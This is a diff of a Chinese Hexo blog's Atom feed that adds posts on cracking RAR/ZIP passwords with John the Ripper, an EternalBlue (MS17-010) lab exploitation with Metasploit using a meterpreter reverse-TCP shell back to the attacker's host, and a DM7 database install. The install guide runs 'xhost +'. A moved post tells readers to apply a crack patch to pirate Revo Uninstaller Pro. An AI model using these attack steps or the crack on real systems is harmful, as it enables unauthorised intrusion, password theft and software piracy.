@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-09-02T11:10:25.587Z</updated>
+  <updated>2019-09-07T07:27:25.862Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,83 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>John the ripper</title>
+    <link href="http://yoursite.com/2019/09/07/%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
+    <id>http://yoursite.com/2019/09/07/加密文件密码破解/</id>
+    <published>2019-09-07T08:29:32.000Z</published>
+    <updated>2019-09-07T07:27:25.862Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="压缩文件密码破解"><a href="#压缩文件密码破解" class="headerlink" title="压缩文件密码破解"></a>压缩文件密码破解</h1><p>John the ripper kali自带的工具是一款快速破解密码破解程序，不仅仅用于密码破解，还有很多用途</p><h1 id="命令使用"><a href="#命令使用" class="headerlink" title="命令使用"></a>命令使用</h1><p>rar2john + 压缩文件名<br>回车，会出现hash值，我们就是根据这个进行破解</p><h1 id="hash破解"><a href="#hash破解" class="headerlink" title="hash破解"></a>hash破解</h1><p>输出信息保存到一个文本文档中<br>rar2john + 文件名 &gt; hash.txt<br>破解的快慢取决于密码复杂度<br>john 文件名 hash.txt<br>或者 john hash.txt<br>回车破解</p><h1 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h1><p>如果文件是zip格式，就把rar换zip就可以</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;压缩文件密码破解&quot;&gt;&lt;a href=&quot;#压缩文件密码破解&quot; class=&quot;headerlink&quot; title=&quot;压缩文件密码破解&quot;&gt;&lt;/a&gt;压缩文件密码破解&lt;/h1&gt;&lt;p&gt;John the ripper kali自带的工具是一款快速破解密码破解程序，不仅仅用于密码
+      
+    
+    </summary>
+    
+      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
+    
+    
+      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>永恒之蓝利用</title>
+    <link href="http://yoursite.com/2019/09/07/ms17_010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    <id>http://yoursite.com/2019/09/07/ms17_010漏洞利用/</id>
+    <published>2019-09-07T07:29:32.000Z</published>
+    <updated>2019-09-07T07:17:49.631Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h1><p>利用永恒之蓝(ms17_010)漏洞进行win7内网渗透测试获取权限</p><h1 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h1><p>攻击者：kali 192.168.56.144<br>被攻击者：win7 192.168.56.133<br>nmap -sS 192.168.56.133<br>发现开放445端口对应的运行程序是microsoft-ds<br>启动msf<br>use exploit/windows/smb/ms17_010_eternalblue<br>show option<br>set rhosts 192.168.56.133<br>set payload windows/x64/meterpreter/reverse_tcp<br>set lhost 192.168.56.144<br>run</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;永恒之蓝&quot;&gt;&lt;a href=&quot;#永恒之蓝&quot; class=&quot;headerlink&quot; title=&quot;永恒之蓝&quot;&gt;&lt;/a&gt;永恒之蓝&lt;/h1&gt;&lt;p&gt;利用永恒之蓝(ms17_010)漏洞进行win7内网渗透测试获取权限&lt;/p&gt;
+&lt;h1 id=&quot;攻击利用&quot;&gt;&lt;a href=&quot;
+      
+    
+    </summary>
+    
+      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
+    
+    
+      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>dm数据库安装</title>
+    <link href="http://yoursite.com/2019/09/02/dm%E5%AE%89%E8%A3%85/"/>
+    <id>http://yoursite.com/2019/09/02/dm安装/</id>
+    <published>2019-09-02T14:29:32.000Z</published>
+    <updated>2019-09-02T12:52:29.303Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="创建安装用户"><a href="#创建安装用户" class="headerlink" title="创建安装用户"></a>创建安装用户</h1><p>建议用户在安装dm7数据库软件用普通用户，如果用root用户可以跳过本步骤</p><h1 id="创建安装用户组"><a href="#创建安装用户组" class="headerlink" title="创建安装用户组"></a>创建安装用户组</h1><p>groupadd dinstall(新建dinstall组)</p><h1 id="创建安装用户-1"><a href="#创建安装用户-1" class="headerlink" title="创建安装用户"></a>创建安装用户</h1><p>useradd -g dinstall dmdba(新建dmdba用户并把用户归入dinstall组)</p><h1 id="初始化用户密码"><a href="#初始化用户密码" class="headerlink" title="初始化用户密码"></a>初始化用户密码</h1><p>passwd dmdba(为dmdba用户设置密码)</p><h1 id="检查系统资源限制"><a href="#检查系统资源限制" class="headerlink" title="检查系统资源限制"></a>检查系统资源限制</h1><p>为了使达梦数据库能够正常运行，建议用户检查 ulimit 的参数。<br>首先用户使用 dmdba 系统用户进行登录， 运行 ulimit–a 进行查询。<br>data seg size (kbytes, -d)<br>建议用户设置为 1048576(即 1GB)以上或 unlimited(无限制)，此参数过小将导致数据库启动失败。<br>file size(blocks, -f)<br>建议用户设置为 unlimited(无限制)，此参数过小将导致数据库安装或初始化失败。<br>open files(-n)<br>建议用户设置为 65536 以上或 unlimited(无限制)。<br>virtual memory (kbytes, -v)<br>建议用户设置为 1048576(即 1GB)以上或 unlimited(无限制)，此参数过小将导致数据库启动失败。</p><h1 id="安装前提示"><a href="#安装前提示" class="headerlink" title="安装前提示"></a>安装前提示</h1><p>通常都是默认值不用改，open files的值可能是1024，则需改为65536以上，这里我改为102400，修改配置文件/etc/security/limits.conf后面加上：</p><ul><li>soft nofile 102400</li><li>hard nofile 102400<br>这种方法可能需要重启才能生效，不想重启，可以临时修改<br>ulimit –HSn 102400<br>这种方法只是临时修改，只在当前终端生效，再执行ulimit–a确认是否修改成功。<h1 id="dm7数据库安装"><a href="#dm7数据库安装" class="headerlink" title="dm7数据库安装"></a>dm7数据库安装</h1>将安装包dm7_setup_rh6_64（如果拿到的DM7软件包为iso文件，挂载到系统中：mount -o loop XXX.iso /xxx(xxx为指定目录）传到/opt/目录下，修改安装包所有者<br>chown -R dmdba:dinstall /opt setup_rh6_64<h1 id="赋予安装文件执行权限"><a href="#赋予安装文件执行权限" class="headerlink" title="赋予安装文件执行权限"></a>赋予安装文件执行权限</h1>chmod 755 /opt/dm7_setup_rh6_64/DMInstall.bin<h1 id="切换dmdba用户"><a href="#切换dmdba用户" class="headerlink" title="切换dmdba用户"></a>切换dmdba用户</h1>开始用root用户装的就直接下一步<br>su dmdba<h1 id="进入安装目录"><a href="#进入安装目录" class="headerlink" title="进入安装目录"></a>进入安装目录</h1>cd /opt/dm_7setup_rh6_64_20190902<h1 id="执行安装文件"><a href="#执行安装文件" class="headerlink" title="执行安装文件"></a>执行安装文件</h1>./DMInstall.bin(图形化安装)<br>./DMInstall.bin -i(字符界面安装)<h1 id="安装提示"><a href="#安装提示" class="headerlink" title="安装提示"></a>安装提示</h1>如果用图形化界面安装，进不去图形界面或者报错，先检查是否安装图形化界面，如果已经安装用root用户执行xhost + 命令来调出图形化界面<br>xhost +  // 按回车键如果出现如下信息，则表示设置成功<br>Access control disabled, clients can connect from any host<br>安装一路下一步即可<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1>安装成功后进入安装目录下bin目录<br>cd /home/dmdba/dmdbms/bin<br>运行./disql<br>输入用户名stydba<br>输入密码123456789<br>出现sql界面则说明安装成功</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;创建安装用户&quot;&gt;&lt;a href=&quot;#创建安装用户&quot; class=&quot;headerlink&quot; title=&quot;创建安装用户&quot;&gt;&lt;/a&gt;创建安装用户&lt;/h1&gt;&lt;p&gt;建议用户在安装dm7数据库软件用普通用户，如果用root用户可以跳过本步骤&lt;/p&gt;
+&lt;h1 id=&quot;创建安装
+      
+    
+    </summary>
+    
+      <category term="数据库" scheme="http://yoursite.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
+    
+    
+      <category term="dm" scheme="http://yoursite.com/tags/dm/"/>
+    
+  </entry>
   
   <entry>
     <title>MySQL主备</title>
@@ -146,31 +223,6 @@
   </entry>
   
   <entry>
-    <title>卸载工具</title>
-    <link href="http://yoursite.com/2019/08/31/%E5%8D%B8%E8%BD%BD%E5%B7%A5%E5%85%B7%E5%AE%8C%E5%85%A8%E4%B8%8D%E7%95%99%E4%B8%8B%E7%97%95%E8%BF%B9/"/>
-    <id>http://yoursite.com/2019/08/31/卸载工具完全不留下痕迹/</id>
-    <published>2019-08-31T07:29:32.000Z</published>
-    <updated>2019-08-31T14:44:08.675Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="最强卸载工具-真正彻底不留垃圾"><a href="#最强卸载工具-真正彻底不留垃圾" class="headerlink" title="最强卸载工具 真正彻底不留垃圾"></a>最强卸载工具 真正彻底不留垃圾</h1><p>Windows 在卸载软件时总是不够彻底干净，系统C盘总会留下大量难以辨别和清理的垃圾文件和临时文件，时间长了注册表也会变得臃肿，不仅浪费硬盘空间，同时也会明显拖慢系统响应和启动速度</p><p>Revo Uninstaller Pro 是一款极为强大好用的专业级软件彻底卸载工具，拥有先进智能扫描算法，可在卸载软件同时更彻底地清除与之相关的垃圾/临时文件和注册表键值；它能强制卸载那些卸载错误的软件，也能通过监视软件安装过程来记录下系统更改之处，从而实现最干净的卸载。如果你希望系统保持干净快速稳定工作，Revo Uninstaller Pro 绝对是应该必备的神器</p><h1 id="安装步骤："><a href="#安装步骤：" class="headerlink" title="安装步骤："></a>安装步骤：</h1><p>安装后不要立刻运行Revo Uninstaller Pro，将破解补丁复制到C:Program FilesVS Revo GroupRevo Uninstaller Pro目录下面，运行破解补丁，点击PATCH按钮，再输入任意名称即可注册。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;最强卸载工具-真正彻底不留垃圾&quot;&gt;&lt;a href=&quot;#最强卸载工具-真正彻底不留垃圾&quot; class=&quot;headerlink&quot; title=&quot;最强卸载工具 真正彻底不留垃圾&quot;&gt;&lt;/a&gt;最强卸载工具 真正彻底不留垃圾&lt;/h1&gt;&lt;p&gt;Windows 在卸载软件时总是不够
-      
-    
-    </summary>
-    
-      <category term="资源" scheme="http://yoursite.com/categories/%E8%B5%84%E6%BA%90/"/>
-    
-    
-      <category term="共享" scheme="http://yoursite.com/tags/%E5%85%B1%E4%BA%AB/"/>
-    
-  </entry>
-  
-  <entry>
     <title>Python脚本</title>
     <link href="http://yoursite.com/2019/08/31/python%E5%88%B7%E6%8A%96%E9%9F%B3%E8%AE%BF%E9%97%AE/"/>
     <id>http://yoursite.com/2019/08/31/python刷抖音访问/</id>
@@ -184,6 +236,31 @@
       
       
         &lt;h1 id=&quot;Python脚本抖音刷视频播放量&quot;&gt;&lt;a href=&quot;#Python脚本抖音刷视频播放量&quot; class=&quot;headerlink&quot; title=&quot;Python脚本抖音刷视频播放量&quot;&gt;&lt;/a&gt;Python脚本抖音刷视频播放量&lt;/h1&gt;&lt;p&gt;粘贴抖音链接，回车键挂机刷即
+      
+    
+    </summary>
+    
+      <category term="资源" scheme="http://yoursite.com/categories/%E8%B5%84%E6%BA%90/"/>
+    
+    
+      <category term="共享" scheme="http://yoursite.com/tags/%E5%85%B1%E4%BA%AB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>卸载工具</title>
+    <link href="http://yoursite.com/2019/08/31/%E5%8D%B8%E8%BD%BD%E5%B7%A5%E5%85%B7%E5%AE%8C%E5%85%A8%E4%B8%8D%E7%95%99%E4%B8%8B%E7%97%95%E8%BF%B9/"/>
+    <id>http://yoursite.com/2019/08/31/卸载工具完全不留下痕迹/</id>
+    <published>2019-08-31T07:29:32.000Z</published>
+    <updated>2019-08-31T14:44:08.675Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="最强卸载工具-真正彻底不留垃圾"><a href="#最强卸载工具-真正彻底不留垃圾" class="headerlink" title="最强卸载工具 真正彻底不留垃圾"></a>最强卸载工具 真正彻底不留垃圾</h1><p>Windows 在卸载软件时总是不够彻底干净，系统C盘总会留下大量难以辨别和清理的垃圾文件和临时文件，时间长了注册表也会变得臃肿，不仅浪费硬盘空间，同时也会明显拖慢系统响应和启动速度</p><p>Revo Uninstaller Pro 是一款极为强大好用的专业级软件彻底卸载工具，拥有先进智能扫描算法，可在卸载软件同时更彻底地清除与之相关的垃圾/临时文件和注册表键值；它能强制卸载那些卸载错误的软件，也能通过监视软件安装过程来记录下系统更改之处，从而实现最干净的卸载。如果你希望系统保持干净快速稳定工作，Revo Uninstaller Pro 绝对是应该必备的神器</p><h1 id="安装步骤："><a href="#安装步骤：" class="headerlink" title="安装步骤："></a>安装步骤：</h1><p>安装后不要立刻运行Revo Uninstaller Pro，将破解补丁复制到C:Program FilesVS Revo GroupRevo Uninstaller Pro目录下面，运行破解补丁，点击PATCH按钮，再输入任意名称即可注册。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;最强卸载工具-真正彻底不留垃圾&quot;&gt;&lt;a href=&quot;#最强卸载工具-真正彻底不留垃圾&quot; class=&quot;headerlink&quot; title=&quot;最强卸载工具 真正彻底不留垃圾&quot;&gt;&lt;/a&gt;最强卸载工具 真正彻底不留垃圾&lt;/h1&gt;&lt;p&gt;Windows 在卸载软件时总是不够
       
     
     </summary>
